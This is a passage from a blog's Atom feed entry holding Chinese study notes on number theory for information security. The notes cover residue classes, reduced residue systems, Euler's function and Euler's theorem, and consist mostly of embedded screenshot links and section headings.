src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200403224812594.png" alt></p><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200403224939302.png" alt></p><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200403225013389.png" alt></p><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200403225117248.png" alt></p><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200403225331985.png" alt></p><h4 id="0x-02-剩余类与完全剩余"><a href="#0x-02-剩余类与完全剩余" class="headerlink" title="0x 02 剩余类与完全剩余"></a>0x 02 剩余类与完全剩余</h4><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200404225247817.png" alt></p><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200404225914840.png" alt></p><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200404230300776.png" alt></p><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200404232810037.png" alt></p><h4 id="0x-03-简化剩余系与欧拉函数"><a href="#0x-03-简化剩余系与欧拉函数" class="headerlink" title="0x 03 简化剩余系与欧拉函数"></a>0x 03 简化剩余系与欧拉函数</h4><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200404233701768.png" alt></p><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200406100107582.png" alt></p><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200406204153855.png" alt></p><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200406204246058.png" alt></p><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200406204313339.png" alt></p><h4 id="0x-04-欧拉定理"><a href="#0x-04-欧拉定理" class="headerlink" title="0x 04 欧拉定理"></a>0x 04 欧拉定理</h4>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;第一章-整数的可除性&quot;&gt;&lt;a href=&quot;#第一章-整数的可除性&quot; class=&quot;headerlink&quot; title=&quot;第一章 整数的可除性&quot;&gt;&lt;/a&gt;第一章 整数的可除性&lt;/h3&gt;&lt;h4 id=&quot;0x-01-广义欧几里得除法-求最大公因数&quot;&gt;&lt;a href=&quot;#
      
    
    </summary>
    
    
      <category term="knowledge" scheme="http://yoursite.com/categories/knowledge/"/>
    
    
      <category term="信安数基" scheme="http://yoursite.com/tags/%E4%BF%A1%E5%AE%89%E6%95%B0%E5%9F%BA/"/>
    
  </entry>
  
</feed>
